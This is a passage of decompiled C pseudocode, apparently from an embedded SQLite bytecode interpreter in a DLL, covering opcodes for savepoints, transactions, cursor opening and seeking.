                v126 = sub_10059BD0(v354, (int *)(*(_DWORD *)&v353[20] + 4 * *(_DWORD *)&v353[36]));
              }
              else
              {
                *(_DWORD *)(*(_DWORD *)&v353[20] + 4 * *(_DWORD *)&v353[36]) = *v354;
                v126 = 1;
              }
              v354 += v126;
              v127 = sub_1005BFBE(*(_DWORD *)(*(_DWORD *)&v353[20] + 4 * *(_DWORD *)&v353[36]));
              v357 += v127;
            }
            v125 = v128 + 1;
            *(_DWORD *)&v353[36] = v125;
            if ( v125 >= *(int *)&v353[28] )
              break;
            v124 = v354;
          }
        }
        sub_10059FC7((int *)&v353[48]);
        *(_WORD *)&v353[76] = 1;
        if ( v354 > v355 || v357 > (unsigned int)v352 || v354 == v355 && v357 != (unsigned int)v352 )
        {
LABEL_302:
          v365 = 11;
          goto LABEL_58;
        }
        v119 = *(_DWORD *)&v353[20];
LABEL_290:
        if ( *(_DWORD *)(4 * *(_DWORD *)&v353[4] + *(_DWORD *)&v353[24]) )
        {
          if ( *(_DWORD *)&v353[12] )
          {
            sub_10059F6C(*(int **)&v353[44]);
            v129 = (char *)(*(_DWORD *)&v353[12] + *(_DWORD *)(4 * *(_DWORD *)&v353[4] + *(_DWORD *)&v353[24]));
            v130 = *(_DWORD *)(4 * *(_DWORD *)&v353[4] + *(_DWORD *)&v353[20]);
          }
          else
          {
            *(_DWORD *)&v353[32] = sub_1005BFBE(*(_DWORD *)(4 * *(_DWORD *)&v353[4] + v119));
            sub_1005A3D5(*(int *)&v353[44], (int *)&v353[48]);
            v365 = sub_1005A70D(
                     (int)&v353[48],
                     *(int *)&v353[16],
                     *(size_t *)&v353[32],
                     *(_DWORD *)(*(_DWORD *)&v353[24] + 4 * *(_DWORD *)&v353[4]),
                     *(unsigned __int8 *)(*(_DWORD *)&v353[8] + 23));
            if ( v365 )
              goto LABEL_57;
            v129 = *(char **)&v353[68];
            *(_DWORD *)&v353[40] = *(_DWORD *)&v353[68];
            v130 = *(_DWORD *)(*(_DWORD *)&v353[20] + 4 * *(_DWORD *)&v353[4]);
          }
          sub_1005C051(v130, v129, *(int *)&v353[44]);
          *(_BYTE *)(*(_DWORD *)&v353[44] + 31) = v351;
        }
        else
        {
          if ( v9[1] != 0xF8 )
            goto LABEL_299;
          sub_1005A356(*((_DWORD *)v9 + 4), *(int *)&v353[44], 2048);
        }
        v1 = (int)a1;
LABEL_299:
        if ( *(_DWORD *)&v353[84] )
        {
          *(_WORD *)(*(_DWORD *)&v353[44] + 28) &= 0xE7FFu;
          *(_WORD *)(*(_DWORD *)&v353[44] + 28) |= 0x200u;
          *(_DWORD *)(*(_DWORD *)&v353[44] + 20) = *(_DWORD *)&v353[68];
          *(_DWORD *)(*(_DWORD *)&v353[44] + 36) = *(_DWORD *)&v353[84];
        }
        v131 = sub_10059E08(*(int *)&v353[44]);
LABEL_790:
        v365 = v131;
        goto LABEL_58;
      case 0x1Du:
        v132 = (_BYTE *)*((_DWORD *)v9 + 4);
        LODWORD(v352) = v132;
        for ( i = v8 + 40 * *((_DWORD *)v9 + 1); ; i += 40 )
        {
          BYTE4(v352) = *v132;
          if ( !BYTE4(v352) )
            break;
          LODWORD(v352) = v352 + 1;
          sub_1005C806(i, SBYTE4(v352), v351);
          v132 = (_BYTE *)v352;
        }
        LODWORD(v352) = v352 + 1;
        goto LABEL_58;
      case 0x1Eu:
        HIDWORD(v352) = 0;
        *(_DWORD *)v353 = 0;
        memset(&v353[8], 0, 12);
        *(_DWORD *)&v353[36] = *((_DWORD *)v9 + 1);
        v134 = v8 + 40 * *(_DWORD *)&v353[36];
        v135 = *(unsigned __int8 *)(v1 + 99);
        *(_DWORD *)&v353[40] = *((_DWORD *)v9 + 4);
        *(_DWORD *)&v353[28] = v134;
        *(_DWORD *)&v353[36] = *((_DWORD *)v9 + 2);
        *(_DWORD *)&v353[32] = 40 * *(_DWORD *)&v353[36] + v134 - 40;
        *(_DWORD *)&v353[44] = v135;
        *(_QWORD *)((char *)&v352 + 4) = v134;
        if ( v134 <= *(_DWORD *)&v353[32] )
        {
          do
          {
            if ( *(_DWORD *)&v353[40] )
              sub_1005C806(
                SDWORD1(v352),
                *(_BYTE *)((DWORD1(v352) - *(_DWORD *)&v353[28]) / 40 + *(_DWORD *)&v353[40]),
                v351);
            *(_DWORD *)&v353[24] = sub_1005BF02(SDWORD1(v352), *(int *)&v353[44]);
            *(_DWORD *)&v353[52] = sub_1005BFBE(*(unsigned int *)&v353[24]);
            *((_QWORD *)&v352 + 1) += *(int *)&v353[52];
            *(_DWORD *)v353 += sub_10059C32(*(unsigned int *)&v353[24]);
            if ( *(_DWORD *)&v353[52] )
              *(_DWORD *)&v353[16] = 0;
            DWORD1(v352) += 40;
          }
          while ( DWORD1(v352) <= *(_DWORD *)&v353[32] );
        }
        v136 = sub_10059C32(*(int *)v353);
        *(_DWORD *)v353 += v136;
        *(_DWORD *)&v353[20] = v136;
        if ( v136 < sub_10059C32(*(int *)v353) )
          ++*(_DWORD *)v353;
        *(_QWORD *)&v353[8] = *((_QWORD *)&v352 + 1) + *(int *)v353 - (__int64)*(int *)&v353[16];
        if ( *(__int64 *)&v353[8] > (int)v7[18] )
          goto LABEL_768;
        v137 = (int *)(v361 + 40 * *((_DWORD *)v9 + 3));
        v363 = v137;
        if ( sub_10059D49(DWORD2(v352) + *(_DWORD *)v353 - *(_DWORD *)&v353[16], (int)v137, 0) )
          goto LABEL_828;
        v138 = (_BYTE *)v137[5];
        LODWORD(v352) = v138;
        if ( *(_DWORD *)v353 >= 0x80u )
        {
          v139 = sub_10059A11(v138, *(unsigned int *)v353);
        }
        else
        {
          *v138 = v353[0];
          v139 = 1;
        }
        *(_DWORD *)&v353[48] = v139;
        v140 = *(_DWORD *)&v353[28];
        DWORD1(v352) = *(_DWORD *)&v353[28];
        while ( v140 <= *(_DWORD *)&v353[32] )
        {
          v141 = sub_1005BF02(SDWORD1(v352), *(int *)&v353[44]);
          *(_DWORD *)&v353[24] = v141;
          if ( v141 >= 0x80 )
          {
            v142 = sub_10059A11((_BYTE *)(*(_DWORD *)&v353[48] + v352), v141);
          }
          else
          {
            *(_BYTE *)(*(_DWORD *)&v353[48] + v352) = v141;
            v142 = 1;
          }
          *(_DWORD *)&v353[48] += v142;
          DWORD1(v352) += 40;
          v140 = DWORD1(v352);
        }
        v143 = *(_DWORD *)&v353[28];
        DWORD1(v352) = *(_DWORD *)&v353[28];
        while ( v143 <= *(_DWORD *)&v353[32] )
        {
          v144 = sub_1005BFD1(SDWORD1(v352), (void *)(*(_DWORD *)&v353[48] + v352), *(int *)&v353[44]);
          *(_DWORD *)&v353[48] += v144;
          DWORD1(v352) += 40;
          v143 = DWORD1(v352);
        }
        v145 = *(_DWORD *)&v353[8];
        v137[8] = 0;
        v137[6] = v145;
        *((_WORD *)v137 + 14) = 1040;
        if ( *(_DWORD *)&v353[16] )
        {
          *v137 = *(_DWORD *)&v353[16];
          *((_WORD *)v137 + 14) = 1040;
        }
        goto LABEL_331;
      case 0x1Fu:
        DWORD2(v352) = **(_DWORD **)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        if ( DWORD2(v352) )
          v365 = sub_10066209(SDWORD2(v352), &v352);
        else
          *(_QWORD *)&v352 = 0i64;
        goto LABEL_335;
      case 0x20u:
        LODWORD(v352) = *((_DWORD *)v9 + 1);
        DWORD1(v352) = *((_DWORD *)v9 + 4);
        if ( !(_DWORD)v352 )
        {
          if ( (int)v7[36] > 0 )
          {
            sub_10059206((unsigned int *)(v1 + 92), (int)v7, aCannotOpenSave);
            goto LABEL_379;
          }
          DWORD2(v352) = sub_10059297((_BYTE *)DWORD1(v352));
          v146 = sub_10059073((int)v7, DWORD2(v352) + 25);
          HIDWORD(v352) = v146;
          if ( v146 )
          {
            *v146 = v146 + 6;
            memcpy(
              *(void **)HIDWORD(v352),
              (const void *)DWORD1(v352),
              (unsigned __int64)(*(_QWORD *)((char *)&v352 + 4) + 0x100000000i64) >> 32);
            if ( *((_BYTE *)v7 + 28) )
            {
              *((_BYTE *)v7 + 28) = 0;
              *((_BYTE *)v7 + 460) = 1;
            }
            else
            {
              ++v7[113];
            }
            *(_DWORD *)(HIDWORD(v352) + 16) = v7[112];
            v7[112] = HIDWORD(v352);
            *(_QWORD *)(HIDWORD(v352) + 8) = *((_QWORD *)v7 + 58);
          }
LABEL_57:
          v1 = (int)a1;
          goto LABEL_58;
        }
        *(_DWORD *)&v353[8] = 0;
        *(_DWORD *)v353 = v7[112];
        v147 = *(_DWORD *)v353;
        if ( !*(_DWORD *)v353 )
          goto LABEL_348;
        do
        {
          if ( !sub_100593BE(*(unsigned __int8 **)v147, (unsigned __int8 *)DWORD1(v352)) )
            break;
          ++*(_DWORD *)&v353[8];
          v147 = *(_DWORD *)(v147 + 16);
          *(_DWORD *)v353 = v147;
        }
        while ( v147 );
        v148 = 0;
        if ( !v147 )
        {
LABEL_348:
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, "no such savepoint: %s", (const char *)DWORD1(v352));
LABEL_394:
          v365 = 1;
          goto LABEL_58;
        }
        if ( (int)v7[36] > 0 )
        {
          if ( (_DWORD)v352 == 2 )
LABEL_376:
            v150 = aRollback;
          else
            v150 = aRelease;
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, "cannot %s savepoint - SQL statements in progress", v150);
LABEL_379:
          v365 = 5;
          goto LABEL_58;
        }
        if ( (_DWORD)v352 == 2 && (int)v7[35] > 1 )
          goto LABEL_376;
        if ( *(_DWORD *)(v147 + 16) || !*((_BYTE *)v7 + 460) )
        {
          v344 = 0;
        }
        else
        {
          v344 = 1;
          if ( (_DWORD)v352 == 1 )
          {
            v365 = sub_1005BA17(v1, 1);
            if ( !v365 )
            {
              *((_BYTE *)v7 + 28) = 1;
              if ( sub_1005BA6D(v1) != 5 )
              {
                *((_BYTE *)v7 + 460) = 0;
                v365 = *(_DWORD *)(v1 + 88);
                goto LABEL_369;
              }
              *(_DWORD *)(v1 + 84) = v362;
              *((_BYTE *)v7 + 28) = 0;
              goto LABEL_830;
            }
            goto LABEL_773;
          }
        }
        v149 = v7[113] - *(_DWORD *)&v353[8] - 1;
        *(_QWORD *)&v353[8] = (unsigned int)v149;
        if ( (int)v7[1] > 0 )
        {
          while ( 1 )
          {
            v365 = sub_10063373(*(_DWORD *)(16 * v148 + v7[2] + 4), v352, v149);
            if ( v365 )
              goto LABEL_841;
            v148 = *(_DWORD *)&v353[12] + 1;
            *(_DWORD *)&v353[12] = v148;
            if ( v148 >= v7[1] )
              break;
            v149 = *(_DWORD *)&v353[8];
          }
          v147 = *(_DWORD *)v353;
        }
        if ( (_DWORD)v352 == 2 && (v7[3] & 0x200) != 0 )
        {
          sub_1005C640((int)v7);
          sub_1006A029(0, v7);
          goto LABEL_369;
        }
        while ( v7[112] != v147 )
        {
          *(_DWORD *)&v353[4] = v7[112];
          v7[112] = *(_DWORD *)(*(_DWORD *)&v353[4] + 16);
          sub_10058EC7((int)v7, *(unsigned int *)&v353[4]);
          --v7[113];
LABEL_369:
          v147 = *(_DWORD *)v353;
        }
        if ( (_DWORD)v352 == 1 )
        {
          v7[112] = *(_DWORD *)(v147 + 16);
          sub_10058EC7((int)v7, *(unsigned int *)v353);
          if ( !v344 )
            --v364[113];
        }
        else
        {
          v7[116] = *(_DWORD *)(v147 + 8);
          v7[117] = *(_DWORD *)(v147 + 12);
        }
        goto LABEL_58;
      case 0x21u:
        LODWORD(v352) = *((_DWORD *)v9 + 1);
        v151 = *((_DWORD *)v9 + 2);
        DWORD1(v352) = v151;
        if ( !(_DWORD)v352 || *((_BYTE *)v7 + 28) )
        {
          DWORD2(v352) = 0;
        }
        else
        {
          DWORD2(v352) = 1;
          if ( v151 )
          {
            if ( (int)v7[35] > 1 )
            {
              sub_10059206((unsigned int *)(v1 + 92), (int)v7, aCannotRollback);
              goto LABEL_379;
            }
          }
          else if ( (int)v7[36] > 0 )
          {
            sub_10059206((unsigned int *)(v1 + 92), (int)v7, aCannotCommitTr);
            goto LABEL_379;
          }
        }
        if ( (_DWORD)v352 != *((unsigned __int8 *)v7 + 28) )
        {
          if ( v151 )
          {
            sub_10053F1F((int)v7);
            *((_BYTE *)v7 + 28) = 1;
          }
          else
          {
            v365 = sub_1005BA17(v1, 1);
            if ( v365 )
              goto LABEL_773;
            *((_BYTE *)v7 + 28) = v352;
            if ( sub_1005BA6D(v1) == 5 )
            {
              *(_DWORD *)(v1 + 84) = v362;
              *((_BYTE *)v7 + 28) = 1 - v352;
              goto LABEL_830;
            }
          }
          sub_10053CF5((int)v7);
          v1 = (int)a1;
          v365 = a1[22] != 0 ? 1 : 101;
          goto LABEL_773;
        }
        if ( (_DWORD)v352 )
        {
          v152 = aCannotRollback_0;
          if ( !v151 )
            v152 = aCannotCommitNo;
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, v152);
        }
        else
        {
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, aCannotStartATr);
        }
        goto LABEL_394;
      case 0x22u:
        LODWORD(v352) = *(_DWORD *)(16 * *((_DWORD *)v9 + 1) + v7[2] + 4);
        if ( !(_DWORD)v352 )
          goto LABEL_58;
        v365 = sub_10062A0B(v352, *((_DWORD *)v9 + 2));
        if ( v365 == 5 )
        {
          *(_DWORD *)(v1 + 84) = v362;
          v365 = 5;
          *(_DWORD *)(v1 + 88) = 5;
          goto LABEL_773;
        }
        if ( v365 )
          goto LABEL_841;
        if ( *((_DWORD *)v9 + 2) && *(_BYTE *)(v1 + 101) && (!*((_BYTE *)v7 + 28) || (int)v7[35] > 1) )
        {
          v153 = (int *)(v1 + 200);
          if ( !*(_DWORD *)(v1 + 200) )
          {
            v154 = v7[113];
            *v153 = ++v7[114] + v154;
          }
          v365 = sub_10063337(v352, *v153);
          *(_DWORD *)(v1 + 192) = v7[116];
          *(_DWORD *)(v1 + 196) = v7[117];
        }
        goto LABEL_58;
      case 0x23u:
        DWORD1(v352) = *((_DWORD *)v9 + 1);
        DWORD2(v352) = *((_DWORD *)v9 + 3);
        sub_1006618B(*(_DWORD *)(16 * DWORD1(v352) + v7[2] + 4), SDWORD2(v352), (int *)&v352);
        goto LABEL_406;
      case 0x24u:
        LODWORD(v352) = v7[2] + 16 * *((_DWORD *)v9 + 1);
        v350 = v361 + 40 * *((_DWORD *)v9 + 3);
        sub_1005A15D(v350);
        v155 = sub_100661BB(*(_DWORD *)(v352 + 4), *((_DWORD *)v9 + 2), *(_DWORD *)v350);
        v156 = (int)v349;
        v365 = v155;
        v157 = *((_DWORD *)v349 + 2);
        if ( v157 == 1 )
        {
          **(_DWORD **)(v352 + 12) = *(_DWORD *)v350;
          v7[3] |= 0x200u;
        }
        else if ( v157 == 2 )
        {
          *(_BYTE *)(*(_DWORD *)(v352 + 12) + 72) = *(_BYTE *)v350;
        }
        if ( *(_DWORD *)(v156 + 4) == 1 )
        {
          sub_1005C640((int)v7);
          *(_BYTE *)(v1 + 98) = 0;
        }
        goto LABEL_58;
      case 0x25u:
        DWORD1(v352) = *(_DWORD *)(16 * *((_DWORD *)v9 + 1) + v7[2] + 4);
        if ( DWORD1(v352) )
          sub_1006618B(SDWORD1(v352), 1, (int *)&v352);
        else
          LODWORD(v352) = 0;
        if ( (_DWORD)v352 != *((_DWORD *)v9 + 2) )
        {
          sub_10058EC7((int)v7, *(_DWORD *)(v1 + 92));
          *(_DWORD *)(v1 + 92) = sub_10059194(aDatabaseSchema_0);
          v158 = *((_DWORD *)v9 + 1);
          if ( **(_DWORD **)(16 * v158 + v7[2] + 12) != (_DWORD)v352 )
            sub_1006A029(v158, v7);
          sub_1005C640((int)v7);
          v365 = 17;
        }
        goto LABEL_58;
      case 0x26u:
      case 0x27u:
        if ( *(_BYTE *)(v1 + 98) )
        {
          v365 = 4;
          goto LABEL_58;
        }
        *(_QWORD *)&v352 = 0i64;
        *((_QWORD *)&v352 + 1) = *((_QWORD *)v9 + 1);
        v159 = v7[2] + 16 * HIDWORD(v352);
        *(_DWORD *)&v353[12] = v159;
        *(_DWORD *)&v353[4] = *(_DWORD *)(v159 + 4);
        if ( *v9 == 39 )
        {
          *(_DWORD *)v353 = 1;
          v160 = *(_BYTE *)(*(_DWORD *)(v159 + 12) + 72);
          if ( v160 < *(_BYTE *)(v1 + 99) )
            *(_BYTE *)(v1 + 99) = v160;
        }
        else
        {
          *(_DWORD *)v353 = 0;
        }
        if ( v9[3] )
        {
          v161 = (_DWORD *)(v361 + 40 * DWORD2(v352));
          sub_1005A15D((int)v161);
          DWORD2(v352) = *v161;
          if ( SDWORD2(v352) < 2 )
          {
            v365 = 11;
            goto LABEL_841;
          }
          v6 = v352;
        }
        v162 = v9[1];
        if ( v162 == 0xFA )
        {
          v163 = *(_DWORD *)v1;
          DWORD1(v352) = *((_DWORD *)v9 + 4);
          *(_BYTE *)(DWORD1(v352) + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v163 + 8) + 12) + 73);
          v6 = *(unsigned __int16 *)(DWORD1(v352) + 6) + 1;
        }
        else
        {
          if ( v162 != 0xF2 )
            goto LABEL_434;
          v6 = *((_DWORD *)v9 + 4);
        }
        LODWORD(v352) = v6;
LABEL_434:
        v164 = sub_1005C6C7((_DWORD *)v1, *((_DWORD *)v9 + 1), v6, SHIDWORD(v352), 1);
        *(_DWORD *)&v353[8] = v164;
        if ( !v164 )
          goto LABEL_828;
        *((_BYTE *)v164 + 20) = 1;
        v165 = sub_100633BB(**(_DWORD **)&v353[8], *(int *)&v353[4], SDWORD2(v352), *(int *)v353, SDWORD1(v352));
        v365 = v165;
        *(_DWORD *)(*(_DWORD *)&v353[8] + 40) = DWORD1(v352);
        if ( v165 == 16 )
        {
          **(_DWORD **)&v353[8] = 0;
          v365 = 0;
        }
        *(_BYTE *)(*(_DWORD *)&v353[8] + 22) = v349[1] != 0xFA;
        v166 = *(_DWORD *)&v353[8];
LABEL_438:
        *(_BYTE *)(v166 + 23) = *(_BYTE *)(v166 + 22) == 0;
        goto LABEL_58;
      case 0x28u:
        v167 = sub_1005C6C7((_DWORD *)v1, *((_DWORD *)v9 + 1), *((_DWORD *)v9 + 2), -1, 1);
        LODWORD(v352) = v167;
        if ( !v167 )
          goto LABEL_828;
        v168 = v364;
        *((_BYTE *)v167 + 20) = 1;
        v365 = sub_100541BA((int)v168, 1054, 0, (int *)(v352 + 32), 1, 500);
        if ( !v365 )
        {
          v365 = sub_10062A0B(*(_DWORD *)(v352 + 32), 1);
          if ( !v365 )
          {
            if ( *((_DWORD *)v9 + 4) )
            {
              v365 = sub_10065E71(*(_DWORD *)(v352 + 32), (unsigned int *)&v340, 2);
              if ( !v365 )
              {
                v365 = sub_100633BB(*(_DWORD *)v352, *(_DWORD *)(v352 + 32), v340, 1, *((_DWORD *)v9 + 4));
                *(_DWORD *)(v352 + 40) = *((_DWORD *)v349 + 4);
                *(_BYTE *)(*(_DWORD *)(v352 + 40) + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)v1 + 8) + 12) + 73);
              }
              *(_BYTE *)(v352 + 22) = 0;
            }
            else
            {
              v365 = sub_100633BB(*(_DWORD *)v352, *(_DWORD *)(v352 + 32), 1, 1, 0);
              *(_BYTE *)(v352 + 22) = 1;
            }
          }
        }
        v166 = v352;
        goto LABEL_438;
      case 0x29u:
        v169 = sub_1005C6C7((_DWORD *)v1, *((_DWORD *)v9 + 1), *((_DWORD *)v9 + 3), -1, 0);
        LODWORD(v352) = v169;
        if ( !v169 )
          goto LABEL_828;
        *((_BYTE *)v169 + 20) = 1;
        *(_DWORD *)(v352 + 36) = *((_DWORD *)v9 + 2);
        *(_BYTE *)(v352 + 22) = 1;
        *(_BYTE *)(v352 + 23) = 0;
        goto LABEL_58;
      case 0x2Au:
        sub_1005B3D0(*(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1)), v1);
        *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1)) = 0;
        goto LABEL_58;
      case 0x2Bu:
      case 0x2Cu:
      case 0x2Du:
      case 0x2Eu:
        v170 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        DWORD2(v352) = v170;
        if ( !*(_DWORD *)v170 )
          goto LABEL_14;
        DWORD1(v352) = *v9;
        *(_BYTE *)(v170 + 20) = 0;
        if ( !*(_BYTE *)(DWORD2(v352) + 22) )
        {
          *(_DWORD *)&v353[24] = *((_DWORD *)v9 + 4);
          *(_DWORD *)v353 = *(_DWORD *)(DWORD2(v352) + 40);
          *(_WORD *)&v353[4] = *(_WORD *)&v353[24];
          *(_WORD *)&v353[6] = 8 * ((BYTE4(v352) - 1) & 1);
          *(_DWORD *)&v353[16] = v361 + 40 * *((_DWORD *)v9 + 3);
          v365 = sub_10063A72(*(_DWORD *)DWORD2(v352), (int)v353, 0i64, 0, (int *)&v352);
          if ( v365 )
            goto LABEL_841;
          *(_BYTE *)(DWORD2(v352) + 17) = 0;
          goto LABEL_478;
        }
        v171 = v361 + 40 * *((_DWORD *)v9 + 3);
        sub_1005C78F(v171);
        LODWORD(v172) = sub_1005A03A(v171);
        *(_QWORD *)&v353[32] = v172;
        *(_BYTE *)(DWORD2(v352) + 17) = 0;
        v173 = *(_WORD *)(v171 + 28);
        if ( (v173 & 4) != 0 )
          goto LABEL_473;
        if ( (v173 & 8) == 0 )
          goto LABEL_455;
        if ( *(_QWORD *)&v353[32] != 0x8000000000000000ui64
          || (double)(__int64)0x8000000000000000ui64 <= *(double *)(v171 + 8) && *(double *)(v171 + 8) <= 0.0 )
        {
          if ( DWORD1(v352) == 43 || DWORD1(v352) == 45 )
          {
            if ( (double)*(__int64 *)&v353[32] < *(double *)(v171 + 8) )
              ++*(_QWORD *)&v353[32];
          }
          else if ( (double)*(__int64 *)&v353[32] > *(double *)(v171 + 8) )
          {
            --*(_QWORD *)&v353[32];
          }
LABEL_473:
          v365 = sub_10063A72(*(_DWORD *)DWORD2(v352), 0, *(__int64 *)&v353[32], 0, (int *)&v352);
          if ( v365 )
          {
LABEL_840:
            v1 = (int)a1;
LABEL_841:
            if ( *((_BYTE *)v364 + 30) )
              v365 = 7;
            if ( v365 != 3082 )
            {
              v337 = sub_10053FC9(v365);
              sub_10059206((unsigned int *)(v1 + 92), v324, aS_3, v337);
            }
            goto LABEL_769;
          }
          v1 = (int)a1;
          if ( !(_DWORD)v352 )
          {
            *(_BYTE *)(DWORD2(v352) + 17) = 1;
            *(_QWORD *)(DWORD2(v352) + 8) = *(_QWORD *)&v353[32];
          }
LABEL_478:
          *(_BYTE *)(DWORD2(v352) + 21) = 0;
          *(_DWORD *)(DWORD2(v352) + 68) = 0;
          if ( SDWORD1(v352) < 45 )
          {
            if ( (int)v352 > 0 || (_QWORD)v352 == 0x2B00000000i64 )
            {
              v175 = sub_10063E4D(*(_DWORD *)DWORD2(v352), &v352);
              goto LABEL_487;
            }
            LODWORD(v352) = *(_BYTE *)(*(_DWORD *)DWORD2(v352) + 67) != 1;
          }
          else
          {
            if ( (int)v352 >= 0 && (_QWORD)v352 != 0x2E00000000i64 )
            {
              LODWORD(v352) = 0;
              goto LABEL_58;
            }
            v175 = sub_10063D40(*(_DWORD *)DWORD2(v352), &v352);
LABEL_487:
            v365 = v175;
            if ( v175 )
              goto LABEL_841;
            *(_BYTE *)(DWORD2(v352) + 17) = 0;
          }
          v94 = (_DWORD)v352 == 0;
          goto LABEL_171;
        }
        LODWORD(v352) = 1;
        if ( *(double *)(v171 + 8) >= 0.0 )
        {
          if ( SDWORD1(v352) > 44 )
            goto LABEL_455;
          v174 = sub_10063A35(&v352, *(_DWORD *)DWORD2(v352));
        }
        else
        {
          if ( SDWORD1(v352) < 45 )
            goto LABEL_455;
          v174 = sub_10063A10(*(_DWORD *)DWORD2(v352), &v352);
        }
        v365 = v174;
        if ( v174 )
          goto LABEL_840;
        if ( (_DWORD)v352 )
        {
LABEL_455:
          v362 = *((_DWORD *)v9 + 2) - 1;
          goto LABEL_57;
        }
        goto LABEL_57;
      case 0x2Fu:
        v176 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v176;
        if ( !*(_DWORD *)v176 )
          goto LABEL_58;
        *(_BYTE *)(v176 + 20) = 0;
        v177 = sub_1005A03A(v361 + 40 * *((_DWORD *)v9 + 2));
        *(_DWORD *)(v352 + 24) = v177;
        *(_DWORD *)(v352 + 28) = v178;
        *(_BYTE *)(v352 + 17) = 0;
        *(_BYTE *)(v352 + 21) = 1;
        goto LABEL_57;
      case 0x30u:
      case 0x31u:
        v179 = *(_DWORD *)(v1 + 52);
        LODWORD(v352) = 0;
        v180 = *(int **)(v179 + 4 * *((_DWORD *)v9 + 1));
        DWORD1(v352) = v180;
        v181 = v8 + 40 * *((_DWORD *)v9 + 3);
        if ( !*v180 )
          goto LABEL_501;
        if ( *((int *)v9 + 4) <= 0 )
        {
          v183 = sub_1005C1FD((int)&v353[24], 151, v180[10], *(_DWORD *)(v181 + 24), *(unsigned __int8 **)(v181 + 20));
          HIDWORD(v352) = v183;
          if ( !v183 )
            goto LABEL_828;
          *((_WORD *)v183 + 3) |= 0x10u;
          v180 = (int *)DWORD1(v352);
          v9 = v349;
        }
        else
        {
          *(_DWORD *)v353 = v180[10];
          v182 = *((_WORD *)v9 + 8);
          *(_DWORD *)&v353[16] = v181;
          *(_WORD *)&v353[4] = v182;
          *(_WORD *)&v353[6] = 16;
          HIDWORD(v352) = v353;
        }
        v184 = sub_10063A72(*v180, SHIDWORD(v352), 0i64, 0, (int *)&v352 + 2);
        v94 = *((_DWORD *)v9 + 4) == 0;
        v365 = v184;
        if ( v94 )
        {
          sub_1005C313(HIDWORD(v352));
          v1 = (int)a1;
        }
        if ( v365 )
          goto LABEL_58;
        LODWORD(v352) = DWORD2(v352) == 0;
        *(_BYTE *)(DWORD1(v352) + 21) = 0;
        *(_DWORD *)(DWORD1(v352) + 68) = 0;
LABEL_501:
        if ( *v9 == 49 )
        {
          v94 = (_DWORD)v352 == 0;
          goto LABEL_171;
        }
        v111 = (_DWORD)v352 == 0;
LABEL_230:
        if ( v111 )
          goto LABEL_14;
        goto LABEL_58;
      case 0x32u:
        v185 = 40 * *((_DWORD *)v9 + 3);
        *(_DWORD *)v353 = v8 + 40 * *((_DWORD *)v9 + 4);
        v186 = (_QWORD *)(v8 + v185);
        DWORD1(v352) = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        *(_QWORD *)(DWORD1(v352) + 64) = 0i64;
        DWORD2(v352) = *(_DWORD *)DWORD1(v352);
        WORD6(v352) = *(_WORD *)(*(_DWORD *)(DWORD1(v352) + 40) + 6);
        LOWORD(v352) = 0;
        if ( !WORD6(v352) )
          goto LABEL_509;
        while ( (*(_BYTE *)(40 * (unsigned __int16)v352 + *(_DWORD *)v353 + 28) & 1) == 0 )
        {
          LOWORD(v352) = v352 + 1;
          if ( (unsigned __int16)v352 >= WORD6(v352) )
            goto LABEL_509;
        }
        v362 = *((_DWORD *)v9 + 2) - 1;
        DWORD2(v352) = 0;
LABEL_509:
        if ( !DWORD2(v352) )
          goto LABEL_58;
        *(_DWORD *)&v353[8] = *(_DWORD *)(DWORD1(v352) + 40);
        *(_WORD *)&v353[12] = WORD6(v352) + 1;
        *(_WORD *)&v353[14] = 32;
        *(_DWORD *)&v353[24] = *(_DWORD *)v353;
        sub_1005A15D((int)v186);
        *(_QWORD *)&v353[32] = *v186;
        v365 = sub_10063A72(SDWORD2(v352), (int)&v353[8], 0i64, 0, (int *)(DWORD1(v352) + 64));
        if ( (v353[14] & 0x20) != 0 || *(_QWORD *)&v353[16] == *(_QWORD *)&v353[32] )
          goto LABEL_14;
        *v186 = *(_QWORD *)&v353[16];
        goto LABEL_58;
      case 0x33u:
        v187 = v8 + 40 * *((_DWORD *)v9 + 3);
        v188 = *(int **)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        LODWORD(v352) = v188;
        v189 = *v188;
        DWORD1(v352) = *v188;
        if ( DWORD1(v352) )
        {
          DWORD2(v352) = 0;
          *(_QWORD *)v353 = *(_QWORD *)v187;
          v365 = sub_10063A72(v189, 0, *(__int64 *)v353, 0, (int *)&v352 + 2);
          *(_DWORD *)(v352 + 8) = *(_DWORD *)v187;
          *(_DWORD *)(v352 + 12) = *(_DWORD *)(v187 + 4);
          *(_BYTE *)(v352 + 17) = DWORD2(v352) == 0;
          *(_BYTE *)(v352 + 20) = 0;
          *(_DWORD *)(v352 + 68) = 0;
          *(_BYTE *)(v352 + 21) = 0;
          if ( DWORD2(v352) )
            v362 = *((_DWORD *)v9 + 2) - 1;
          *(_DWORD *)(v352 + 64) = DWORD2(v352);
        }
        else
        {
          v362 = *((_DWORD *)v9 + 2) - 1;
          v188[16] = 0;
        }
        goto LABEL_58;
      case 0x34u:
        v190 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        v191 = v363;
        *v363 = *(_DWORD *)(v190 + 48);
        v191[1] = *(_DWORD *)(v190 + 52);
        v192 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        ++*(_QWORD *)(v192 + 48);
        goto LABEL_58;
      case 0x35u:
        v193 = *(_DWORD *)(v1 + 52);
        *(_QWORD *)&v352 = 0i64;
        v194 = *(_BYTE **)(v193 + 4 * *((_DWORD *)v9 + 1));
        *((_QWORD *)&v352 + 1) = (unsigned int)v194;
        if ( !*(_DWORD *)v194 )
          goto LABEL_335;
        *(_DWORD *)v353 = 0;
